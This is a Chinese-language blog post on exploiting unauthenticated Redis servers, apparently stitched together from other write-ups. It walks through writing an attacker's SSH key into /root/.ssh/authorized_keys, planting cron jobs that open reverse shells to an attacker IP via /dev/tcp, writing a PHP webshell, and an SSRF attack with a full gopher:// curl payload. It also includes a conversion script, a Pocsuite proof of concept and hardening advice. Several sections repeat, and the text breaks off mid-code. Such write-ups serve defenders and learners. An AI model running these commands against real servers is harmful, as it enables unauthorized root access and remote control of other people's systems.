<!DOCTYPE html>
<html>

  <head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Sci blog jekyll theme">
    <meta name="author" content="AIR RAYA Group">
    <link href='/MyBlog/img/favicon.ico' type='image/icon' rel='shortcut icon'/>

    <title>泽民博客 | Jekyll theme</title>

    <link rel="stylesheet" href="/MyBlog/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
    <link rel="stylesheet" href="/MyBlog/css/font-awesome.min.css">
    <link href="/MyBlog/css/simple-sidebar.css" rel="stylesheet">
	<link href="/MyBlog/css/classic-10_7.css" rel="stylesheet" type="text/css">
    <!-- Custom CSS -->
    <link href="/MyBlog/css/style.css" rel="stylesheet">
    <link href="/MyBlog/css/pygments.css" rel="stylesheet">
    <!-- Fonts -->
 <link href="/MyBlog/css/front.css" rel="stylesheet" type="text/css">
 <link href="/MyBlog/css/Josefin_Slab.css" rel="stylesheet" type="text/css">
<link href="/MyBlog/css/Architects_Daughter.css" rel="stylesheet" type="text/css">
<link href="/MyBlog/css/Schoolbell.css" rel="stylesheet" type="text/css">
<link href="/MyBlog/css/Codystar.css" rel="stylesheet" type="text/css">

 <script type="text/javascript" src="/MyBlog/js/jquery-1.12.0.min.js"></script>	

<link href="/MyBlog/css/calendar/common.css" type="text/css"  rel="stylesheet">
<script type="text/javascript" src="/MyBlog/js/calendar/calendar.js"></script>
	<!-- share this -->
	<script type="text/javascript">var switchTo5x=true;</script>
	<script type="text/javascript" src="/MyBlog/js/buttons.js"></script>
	<script type="text/javascript">stLight.options({publisher: "b28464c3-d287-4257-ad18-058346dd35f7", doNotHash: false, doNotCopy: false, hashAddressBar: false});</script>

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="/MyBlog/js/html5shiv.js"></script>
        <script src="/MyBlog/js/respond.min.js"></script>
    <![endif]-->
   
   <!--百度统计-->
    <script>
    var _hmt = _hmt || [];
    (function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?e965cab8c73512b8b23939e7051d93bd";
    var s = document.getElementsByTagName("script")[0]; 
    s.parentNode.insertBefore(hm, s);
    })();
    </script>
    <script async src="/MyBlog/katex/katex.js"></script>
    <link rel="stylesheet" href="/MyBlog/katex/katex.css">

    <!--轮播图片-->
    <!--script type="text/javascript" src="https://xiazemin.github.io/MyBlog/js/jquery.js"></script>
    <script type="text/javascript" src="https://xiazemin.github.io/MyBlog/js/jquery.stripesrotator.js"></script>
    <script type="text/javascript">
                    $(document).ready(function() {
                    alert($('#rotator_xzm'));
                     alert($('#rotator_xzm').fn);
                    $('#rotator_xzm').stripesRotator({ images: [ "https://xiazemin.github.io/MyBlog/img/BPlusTree.png", "https://xiazemin.github.io/MyBlog/img/linuxMMap.jpeg"] });
                    });
    </script-->

    <!--水印-->
    <script type="text/javascript" src="/MyBlog/js/waterMark.js"></script>
    <script type="text/javascript">
    $(document).ready(function(){
    watermark({watermark_txt0:'泽民博客',watermark_txt1:'zemin',watermark_txt2:(new Date()).Format("yyyy-MM-dd hh:mm:ss.S")});
    })
    </script>
     <!--水印-->
     <!--adscene-->
    <script data-ad-client="ca-pub-6672721494777557" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>

</head>

 <body>
<div id="wrapper">
 <!-- Navigation -->
    <!-- Sidebar -->
        <div id="sidebar-wrapper">
            <ul class="sidebar-nav">
                <li class="sidebar-brand">
                    <a href="/MyBlog">
                        Home
                    </a>
                </li>
                <li>
                    <a href="#">About</a>
                </li>
                <li>
                    <a href="#">Services</a>
                </li>
                <li>
                    <a href="#">Portfolio</a>
                </li>
                <li>
                    <a href="#">Events</a>
                </li>
                <li>
                    <a href="#">Blog</a>
                </li>
                <li>
                    <a href="#">FAQ</a>
                </li>
                <li>
                    <a href="#">Contact</a>
                </li>
            </ul>
        </div>


    <header class="intro-header">
        <div class="container">
            <div class="row">
                <div class="col-lg-12">
                    <div class="heading text-center">
                        <a href="https://xiazemin.github.io/MyBlog/" style="color: #fff; font-size: 4em; font-family: 'Schoolbell', cursive;">泽民博客</a>
                        <a href="#menu-toggle" class="btn btn-default sciblog" id="menu-toggle" style="font-weight: bold;">&#9776; Menu</a>
                    </div>
                </div>
            </div>
        </div>
    </header>

     <script async src="/MyBlog/js/busuanzi.pure.mini.js"></script>

    <script type="text/javascript" src="/MyBlog/js/jquery.js"></script>
    <script type="text/javascript" src="/MyBlog/js/jquery.stripesrotator.js"></script>


 <div class="container">
	<div class="row">
        <div class="box">
                <div class="col-lg-12">
                    <div class="intro-text text-center">
					<h1 class="post-title" itemprop="name headline">redis ssh 漏洞</h1>
					<p class="post-meta"> <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">by 夏泽民</span></span> <time datetime="2019-12-09T00:00:00+08:00" itemprop="datePublished"><i class="fa fa-calendar"></i> Dec 9, 2019</time></p>
					</div>
					 <p>https://github.com/knownsec/pocsuite</p><br />
<br />
<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。</p><br />
<br />
<p>漏洞描述<br />
部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是 Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问 Redis 服务并进行相关操作。</p><br />
<br />
<p>利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。<br />
<!-- more --><br />
二、漏洞利用<br />
首先在本地生产公私钥文件：<br />
$ ssh-keygen –t rsa</p><br />
<br />
<p>然后将公钥写入 foo.txt 文件<br />
$ (echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; foo.txt</p><br />
<br />
<p>连接 Redis 写入文件<br />
$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit<br />
$ redis-cli -h 192.168.1.11<br />
$ 192.168.1.11:6379&gt; config set dir /root/.ssh/<br />
OK<br />
$ 192.168.1.11:6379&gt; config get dir<br />
1) “dir”<br />
2) “/root/.ssh”<br />
$ 192.168.1.11:6379&gt; config set dbfilename “authorized_keys”<br />
OK<br />
$ 192.168.1.11:6379&gt; save<br />
OK</p><br />
<br />
<p>这里讲解下，这里设定了 crackit 的键值为公钥，并通过 redis 命令变更 Redis DB 文件及存放地点为默认 root 用户 SSH key 存放文件，并将键值重定向追加到远程文件 authorized_keys 的末尾，也就上传了公钥。</p><br />
<br />
<p>这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行：<br />
$ ssh –i  id_rsa root@192.168.1.11</p><br />
<br />
<p>可远程利用自己的私钥登录该服务器。</p><br />
<br />
<p>刚刚我们提到公钥登录和 Redis 持久化存放数据操作，这里简单讲下原理</p><br />
<br />
<p>详细讲解 ssh 登录–公钥登录<br />
SSH 提供了公钥登录，可以省去输入密码的步骤。</p><br />
<br />
<p>所谓” 公钥登录”，原理很简单，就是用户将自己的公钥储存在远程主机上。登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录 shell，不再要求密码。</p><br />
<br />
<p>这种方法要求用户必须提供自己的公钥。如果没有现成的，可以直接用 ssh-keygen 生成一个：<br />
$ ssh-keygen</p><br />
<br />
<p>运行上面的命令以后，系统会出现一系列提示，可以一路回车。其中有一个问题是，要不要对私钥设置口令（passphrase），如果担心私钥的安全，这里可以设置一个。</p><br />
<br />
<p>运行结束以后，在 $HOME/.ssh/目录下，会新生成两个文件：id_rsa.pub 和 id_rsa。前者是你的公钥，后者是你的私钥。</p><br />
<br />
<p>通常这时再输入下面的命令，将公钥传送到远程主机 host 上面：<br />
$ ssh-copy-id user@host</p><br />
<br />
<p>authorized_keys 文件，远程主机将用户的公钥，保存在登录后的用户主目录的 $HOME/.ssh/authorized_keys 文件中。公钥就是一段字符串，只要把它追加在 authorized_keys 文件的末尾就行了。</p><br />
<br />
<p>详细相关的 Redis 持久化命令<br />
Redis 支持 2 种持久化策略：snapshot 方式和 commandlog 方式，前者通过将当前内存数据快照周期性写入 RDB 文件来实现；后者通过在 log 中记录 Redis 进程收到的写操作来实现，下次 Redis 重启时，回放 commandlog 来恢复数据状态。<br />
这里使用 RDB 文件写入 SSH key 文件，需要设置以下两个 RDB 相关配置</p><br />
<br />
<p>dbfilename</p><br />
<br />
<p>指定 RDB 文件名，默认为 dump.rdb</p><br />
<br />
<p>dir</p><br />
<br />
<p>指定 RDB 文件存放目录的路径，若包含多级路径，则相关父路径需事先 mkdir 出来，否则启动失败。</p><br />
<br />
<p>set(key, value)：给数据库中名称为 key 的 string 赋予值 value</p><br />
<br />
<p>最后 Client 使用 save 命令通知 redis 做一次快照持久化</p><br />
<br />
<p>修复建议/安全建议</p><br />
<ol><br />
  <li>禁止一些高危命令<br />
修改 redis.conf 文件，添加<br />
rename-command FLUSHALL “”<br />
rename-command CONFIG   “”<br />
rename-command EVAL     “”</li><br />
</ol><br />
<br />
<p>来禁用远程修改 DB 文件地址</p><br />
<br />
<ol><br />
  <li><br />
    <p>以低权限运行 Redis 服务<br />
为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆<br />
$ groupadd -r redis &amp;&amp; useradd -r -g redis redis</p><br />
  </li><br />
  <li><br />
    <p>为 Redis 添加密码验证<br />
修改 redis.conf 文件，添加</p><br />
  </li><br />
</ol><br />
<br />
<p>requirepass mypassword</p><br />
<br />
<ol><br />
  <li><br />
    <p>禁止外网访问 Redis<br />
修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<br />
bind 127.0.0.1</p><br />
  </li><br />
  <li><br />
    <p>保证 authorized_keys 文件的安全<br />
为了保证安全，您应该阻止其他用户添加新的公钥。</p><br />
  </li><br />
</ol><br />
<br />
<p>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<br />
$ chmod 400 ~/.ssh/authorized_keys</p><br />
<br />
<p>为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限：</p><br />
<h1 id="chattr-i-sshauthorized_keys">chattr +i ~/.ssh/authorized_keys</h1><br />
<br />
<p>然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限：</p><br />
<h1 id="chattr-i-ssh">chattr +i ~/.ssh</h1><br />
<br />
<p>注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。</p><br />
<br />
<p>0x00 危害<br />
信息泄露</p><br />
<br />
<p>系统信息<br />
redis保存的信息<br />
GetShell</p><br />
<br />
<p>在Web目录中写入webshell<br />
写入SSH公钥直接连接<br />
写入计划任务(corntab)反弹shell</p><br />
<br />
<p>0x02 信息泄露<br />
数据泄露<br />
获取所有的key值 keys *</p><br />
<br />
<p>系统信息泄露<br />
info 命令</p><br />
<br />
<p>可以看到redis的版本、系统内核版本、配置文件路径等信息</p><br />
<br />
<p>0x03 GetShell<br />
在Web目录中写入webshell<br />
前提条件</p><br />
<br />
<p>已知网站目录的绝对路径，并且具有读写权限<br />
写入SSH公钥直接连接<br />
本地生成公钥和私钥<br />
将公钥写入到目标的.ssh文件夹<br />
ssh 连接</p><br />
<br />
<p>写入ssh-keygen公钥<br />
现在下先在本地生成一对密钥<br />
kingkk@ubuntu:~/.ssh$ ssh-keygen -t rsa<br />
这样就可以在~/.ssh目录下生成一对id_rsa、id_rsa.pub</p><br />
<br />
<p>然后连接靶机redis<br />
kingkk@ubuntu:~/test/redis$ redis-cli -h 192.168.85.132           # 连接靶机<br />
192.168.85.132:6379&gt; config set dir /root/.ssh                    # 设置本地存储文件目录<br />
OK<br />
192.168.85.132:6379&gt; config set dbfilename authorized_keys        # 设置本地存储文件名<br />
OK<br />
192.168.85.132:6379&gt; set x “\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjFdA5iENqT7mVAv3kopJZi0jtaDbXq2VwX7AM4Gk8wkAgBjnNGuxP0Tt5Sz0sQY1brgP7pmtTCeXUhPS33qK9RWXHNNuAAnns3c5nTtEuKvZtE+5aFDiVvyjDBhvR9YfzQFc+MgCDNedF6Fe+tzSPxDvqk5hGUoqEgwQS0NQNEIN93qN/qEiCXrUMacy6JS6fa2AC99JO+0LdVB0yMPgW2neJZSoJOYdFdJiW4XSn94aUf/mHmZQbT2VxNHv1nEspyhssTaNzDrBAE60hL91Q+CEO2ir2sSZ95xwJXJQJbeD1HyyiAhwg/ajoBafT45Ae5BjY+cH9a8gCpzXu8Tp7 kingkk@ubuntu\n\n\n”                                  		                           # 设置一个值为id_rsa.pub公钥值<br />
OK<br />
192.168.85.132:6379&gt; save                                         # 存储数据<br />
OK<br />
这样，我们就把公钥写入对方的服务器了，直接用生成的私钥连接即可<br />
kingkk@ubuntu:~/.ssh$ ssh -i id_rsa root@192.168.85.132<br />
Last login: Sun Mar 11 03:50:15 2018 from 172.22.224.117<br />
[root@localhost ~]# id<br />
uid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023<br />
You have new mail in /var/spool/mail/root</p><br />
<br />
<p>假如报了如下错误<br />
sign_and_send_pubkey: signing failed: agent refused operation<br />
运行下如下两句即可<br />
eval “$(ssh-agent -s)”<br />
ssh-add<br />
利用计划任务反弹shell<br />
先开一个终端监听本地的23333端口<br />
nc -nlvp 23333<br />
利用之前类似的文件写入，写入定时命令<br />
192.168.85.132:6379&gt; set x “\n* * * * * /bin/bash -i &gt; /dev/tcp/192.168.85.128/23333 0&lt;&amp;1 2&gt;&amp;1\n”<br />
OK<br />
192.168.85.132:6379&gt; config set dir /var/spool/cron/<br />
OK<br />
192.168.85.132:6379&gt; config set dbfilename root<br />
OK<br />
192.168.85.132:6379&gt; save<br />
OK<br />
需要等待一会，一般一分钟之内吧，nc就能收到反弹回来的shell了</p><br />
<br />
<p>写入webshell<br />
当redis权限较低，上面两种方法都行不通的时候，可以尝试往web服务中写入一句话，获取webshell<br />
192.168.85.132:6379&gt; set x “&lt;?php phpinfo();?&gt;”<br />
OK<br />
192.168.85.132:6379&gt; config set dir /var/www/html<br />
OK<br />
192.168.85.132:6379&gt; config set dbfilename shell.php<br />
OK<br />
192.168.85.132:6379&gt; save<br />
OK<br />
这样，就能在根目录下生成shell.php。访问一下</p><br />
<br />
<p>结合SSRF<br />
之前能看到，默认情况下虽然是没有密码，但是会开启protected保护模式</p><br />
<br />
<p>在这情况下，我们尝试连接一下对方redis<br />
kingkk@ubuntu:~/test/redis$ redis-cli -h 192.168.85.132<br />
192.168.85.132:6379&gt; info<br />
DENIED Redis is running in protected mode because protected mode is enabled, no bind address was specified, no authentication password is requested to clients. In this mode connections are only accepted from the loopback interface. If you want to connect from external computers to Redis you may adopt one of the following solutions: 1) Just disable protected mode sending the command ‘CONFIG SET protected-mode no’ from the loopback interface by connecting to Redis from the same host the server is running, however MAKE SURE Redis is not publicly accessible from internet if you do so. Use CONFIG REWRITE to make this change permanent. 2) Alternatively you can just disable the protected mode by editing the Redis configuration file, and setting the protected mode option to ‘no’, and then restarting the server. 3) If you started the server manually just for testing, restart it with the ‘–protected-mode no’ option. 4) Setup a bind address or an authentication password. NOTE: You only need to do one of the above things in order for the server to start accepting connections from the outside.</p><br />
<br />
<p>可以看到保护模式拒绝了redis的远程连接，所以经常redis都是配合着ssrf这个可以伪造身份的攻击方式一起进行攻击</p><br />
<br />
<p>gopher协议<br />
Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。 Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p><br />
<br />
<p>可以利用gopher协议传输redis的数据报文，达到类似之前对redis的连接、设置、存储操作</p><br />
<br />
<p>抓取数据报文<br />
在靶机中利用socat抓取发往redis的数据报文</p><br />
<br />
<p>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379<br />
在攻击机中连接靶机的4444端口，重新发送攻击payload</p><br />
<br />
<p>这里先将要执行的命令写入了shell.sh中，方便一次性执行完毕<br />
echo -e “\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n”|redis-cli -h $1 -p $2 -x set 1<br />
redis-cli -h $1 -p $2 config set dir /var/spool/cron/<br />
redis-cli -h $1 -p $2 config set dbfilename root<br />
redis-cli -h $1 -p $2 save<br />
redis-cli -h $1 -p $2 quit<br />
然后在把靶机中执行</p><br />
<br />
<p>./shell.sh 192.168.85.132 4444<br />
返回五个OK就表示执行成功了</p><br />
<br />
<p>利用gopher进行攻击<br />
然后将数据转换成gopher协议的格式<br />
#coding: utf-8<br />
import sys</p><br />
<br />
<p>exp = ‘’</p><br />
<br />
<p>with open(sys.argv[1]) as f:<br />
    for line in f.readlines():<br />
        if line[0] in ‘&gt;&lt;+’:<br />
            continue<br />
        elif line[-3:-1] == r’\r’:<br />
            if len(line) == 3:<br />
                exp = exp + ‘%0a%0d%0a’<br />
            else:<br />
                line = line.replace(r’\r’, ‘%0d%0a’)<br />
                line = line.replace(‘\n’, ‘’)<br />
                exp = exp + line<br />
        elif line == ‘\x0a’:<br />
            exp = exp + ‘%0a’<br />
        else:<br />
            line = line.replace(‘\n’, ‘’)<br />
            exp = exp + line<br />
print exp</p><br />
<br />
<p>然后在本地先监听23333端口</p><br />
<br />
<p>再利用curl发送payload<br />
curl -v ‘gopher://192.168.85.132:6379/_<em>3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$67%0d%0a-e %0a%0a</em>/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.85.128/23333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a<em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a</em>4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a<em>1%0d%0a$4%0d%0asave%0d%0a</em>1%0d%0a$4%0d%0aquit%0d%0a’<br />
等待一会，就能看到nc接到了反弹回来的shell</p><br />
<br />
<p>在php中的ssrf的话需要安装gopher协议拓展，就可以达到一样的效果。</p><br />
<br />
<p>自动化利用<br />
我将之前的三种利用方式都写成了.sh的脚本形式，方便使用,只需本地要提前安装好redis</p><br />
<br />
<p>https://github.com/kingkaki/Exploit-scripts/tree/master/redis 还包含了socat捕获的流量报文样例</p><br />
<br />
<p>https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/</p><br />
<br />
<p>解决redis写公钥依然无法登录的情况<br />
有些朋友在利用Redis写公钥依然无法空密码登录，为什么呢？<br />
解决方法</p><br />
<br />
<p>A、将自己的公钥通过以上方法生成authrized_keys，然后通过本地形式(本机测试本机方式)，ssh localhost 方式尝试登录，如果能正常登录，则表示授权的KEY没有任何问题</p><br />
<br />
<p>B、被渗透的服务器上授权key的权限问题应该为600<br />
利用Linux任务计划来设置授权的authorized_keys权限为600。<br />
echo -e “\n\n*/1 * * * * /bin/chmod 600 ~/.ssh/authorized_keys\n\n”|redis-cli -h 127.0.0.1 -x set 1<br />
redis-cli -h 127.0.0.1 config set dir /var/spool/cron/<br />
redis-cli -h 127.0.0.1 config set dbfilename root<br />
redis-cli -h 127.0.0.1 save</p><br />
<br />
<p>释义：上面这段其实也是保存redis数据的一个过程，不过这个过程是将数据保存为admin，存放在/var /spool/cron下，这个是专门存放任务计划的，而Key 1的值的含义则是：设置任务计划一分钟后执行chmod 600修改authorized_keys的权限为600</p><br />
<br />
<p>C、服务器没有.ssh目录的问题</p><br />
<br />
<p>利用Linux任务计划来创建该文件夹<br />
echo -e “\n\n*/1 * * * * /bin/make ~/.ssh \n\n”|redis-cli -h 127.0.0.1 -x set 2<br />
redis-cli -h 127.0.0.1 config set dir /var/spool/cron/<br />
redis-cli -h 127.0.0.1 config set dbfilename root<br />
redis-cli -h 127.0.0.1 save</p><br />
<br />
<p>D、.ssh目录权限问题</p><br />
<br />
<p>利用Linux任务计划来设置.ssh目录的权限问题<br />
echo -e “\n\n*/1 * * * * /bin/chmod 700 /home/root/.ssh/\n\n”|redis-cli -h 127.0.0.1 -x set 1<br />
redis-cli -h 127.0.0.1 config set dir /var/spool/cron/<br />
redis-cli -h 127.0.0.1 config set dbfilename root<br />
redis-cli -h 127.0.0.1 save</p><br />
<br />
<p>一、漏洞概述<br />
Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。</p><br />
<br />
<p>1、漏洞描述<br />
Redis 安全模型的观念是: “请不要将 Redis 暴露在公开网络中, 因为让不受信任的客户接触到 Redis 是非常危险的” 。</p><br />
<br />
<p>Redis 作者之所以放弃解决未授权访问导致的不安全性是因为, 99.99% 使用 Redis 的场景都是在沙盒化的环境中, 为了0.01%的可能性增加安全规则的同时也增加了复杂性, 虽然这个问题的并不是不能解决的, 但是这在他的设计哲学中仍是不划算的。</p><br />
<br />
<p>因为其他受信任用户需要使用 Redis 或者因为运维人员的疏忽等原因，部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。</p><br />
<br />
<p>利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。</p><br />
<br />
<p>2、漏洞影响<br />
Redis 暴露在公网（即绑定在0.0.0.0:6379，目标IP公网可访问），并且没有开启相关认证和添加相关安全策略情况下可受影响而导致被利用。</p><br />
<br />
<p>通过ZoomEye 的搜索结果显示，有97707在公网可以直接访问的Redis服务。</p><br />
<br />
<p>QQ20151111-0@2x</p><br />
<br />
<p>根据 ZoomEye 的探测，全球无验证可直接利用Redis 分布情况</p><br />
<br />
<p>3、漏洞分析与利用<br />
首先在本地生产公私钥文件：</p><br />
<br />
<p>$ssh-keygen –t rsa<br />
1<br />
$ssh-keygen –t rsa<br />
ssh-keygen</p><br />
<br />
<p>然后将公钥写入 foo.txt 文件</p><br />
<br />
<p>$ (echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; foo.txt<br />
1<br />
$ (echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) &gt; foo.txt<br />
再连接 Redis 写入文件</p><br />
<br />
<p>$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit<br />
$ redis-cli -h 192.168.1.11<br />
$ 192.168.1.11:6379&gt; config set dir /root/.ssh/<br />
OK<br />
$ 192.168.1.11:6379&gt; config get dir<br />
1) “dir”<br />
2) “/root/.ssh”<br />
$ 192.168.1.11:6379&gt; config set dbfilename “authorized_keys”<br />
OK<br />
$ 192.168.1.11:6379&gt; save<br />
OK<br />
$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit<br />
$ redis-cli -h 192.168.1.11<br />
$ 192.168.1.11:6379&gt; config set dir /root/.ssh/<br />
OK<br />
$ 192.168.1.11:6379&gt; config get dir<br />
1) “dir”<br />
2) “/root/.ssh”<br />
$ 192.168.1.11:6379&gt; config set dbfilename “authorized_keys”<br />
OK<br />
$ 192.168.1.11:6379&gt; save<br />
OK<br />
redis_ssh</p><br />
<br />
<p>这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行：</p><br />
<br />
<p>$ ssh –i  id_rsa root@192.168.1.11<br />
1<br />
$ ssh –i  id_rsa root@192.168.1.11<br />
即可远程利用自己的私钥登录该服务器。</p><br />
<br />
<p>当然，写入的目录不限于 /root/.ssh 下的authorized_keys，也可以写入用户目录，不过 Redis 很多以 root 权限运行，所以写入 root 目录下，可以跳过猜用户的步骤。</p><br />
<br />
<p>4、Redis 未授权的其他危害与利用<br />
a）数据库数据泄露<br />
Redis 作为数据库，保存着各种各样的数据，如果存在未授权访问的情况，将会导致数据的泄露，其中包含保存的用户信息等。</p><br />
<br />
<p>redis_user</p><br />
<br />
<p>b）代码执行<br />
Redis可以嵌套Lua脚本的特性将会导致代码执行, 危害同其他服务器端的代码执行, 样例如下        一旦攻击者能够在服务器端执行任意代码, 攻击方式将会变得多且复杂, 这是非常危险的.</p><br />
<br />
<p>redis_lua</p><br />
<br />
<p>通过Lua代码攻击者可以调用 redis.sha1hex() 函数，恶意利用 Redis 服务器进行 SHA-1 的破解。</p><br />
<br />
<p>c）敏感信息泄露<br />
通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫。</p><br />
<br />
<p>redis_info</p><br />
<br />
<p>可以看到泄露了很多 Redis 服务器的信息, 有当前 Redis 版本, 内存运行状态, 服务端个数等等敏感信息。</p><br />
<br />
<p>5、漏洞验证<br />
可以使用Pocsuite（http://github.com/knownsec/pocsuite）执行以下的代码可以用于测试目标地址是否存在未授权的Redis服务。</p><br />
<br />
<p>#!/usr/bin/env python</p><br />
<h1 id="---codingutf-8---">-<em>- coding:utf-8 -</em>-</h1><br />
<br />
<p>import socket<br />
import urlparse<br />
from pocsuite.poc import POCBase, Output<br />
from pocsuite.utils import register</p><br />
<br />
<p>class TestPOC(POCBase):<br />
    vulID = ‘89339’<br />
    version = ‘1’<br />
    author = [‘Anonymous’]<br />
    vulDate = ‘2015-10-26’<br />
    createDate = ‘2015-10-26’<br />
    updateDate = ‘2015-10-26’<br />
    references = [‘http://sebug.net/vuldb/ssvid-89339’]<br />
    name = ‘Redis 未授权访问 PoC’<br />
    appPowerLink = ‘http://redis.io/’<br />
    appName = ‘Redis’<br />
    appVersion = ‘All’<br />
    vulType = ‘Unauthorized access’<br />
    desc = ‘’’<br />
        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。<br />
    ‘’’<br />
    samples = [’’]</p><br />
<br />
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def _verify(self):<br />
    result = {}<br />
    payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'<br />
    s = socket.socket()<br />
    socket.setdefaulttimeout(10)<br />
    try:<br />
        host = urlparse.urlparse(self.url).netloc<br />
        port = 6379<br />
        s.connect((host, port))<br />
        s.send(payload)<br />
        recvdata = s.recv(1024)<br />
        if recvdata and 'redis_version' in recvdata:<br />
            result['VerifyInfo'] = {}<br />
            result['VerifyInfo']['URL'] = self.url<br />
            result['VerifyInfo']['Port'] = port<br />
    except:<br />
        pass<br />
    s.close()<br />
    return self.parse_attack(result)<br />
<br />
def _attack(self):<br />
    return self._verify()<br />
<br />
def parse_attack(self, result):<br />
    output = Output(self)<br />
    if result:<br />
        output.success(result)<br />
    else:<br />
        output.fail('Internet nothing returned')<br />
    return output<br />
</code></pre></div></div><br />
<br />
<p>register(TestPOC)<br />
#!/usr/bin/env python</p><br />
<h1 id="---codingutf-8----1">-<em>- coding:utf-8 -</em>-</h1><br />
<br />
<p>import socket<br />
import urlparse<br />
from pocsuite.poc import POCBase, Output<br />
from pocsuite.utils import register</p><br />
<br />
<p>class TestPOC(POCBase):<br />
    vulID = ‘89339’<br />
    version = ‘1’<br />
    author = [‘Anonymous’]<br />
    vulDate = ‘2015-10-26’<br />
    createDate = ‘2015-10-26’<br />
    updateDate = ‘2015-10-26’<br />
    references = [‘http://sebug.net/vuldb/ssvid-89339’]<br />
    name = ‘Redis 未授权访问 PoC’<br />
    appPowerLink = ‘http://redis.io/’<br />
    appName = ‘Redis’<br />
    appVersion = ‘All’<br />
    vulType = ‘Unauthorized access’<br />
    desc = ‘’’<br />
        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。<br />
    ‘’’<br />
    samples = [’’]</p><br />
<br />
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def _verify(self):<br />
    result = {}<br />
    payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'<br />
    s = socket.socket()<br />
    socket.setdefaulttimeout(10)<br />
    try:<br />
        host = urlparse.urlparse(self.url).netloc<br />
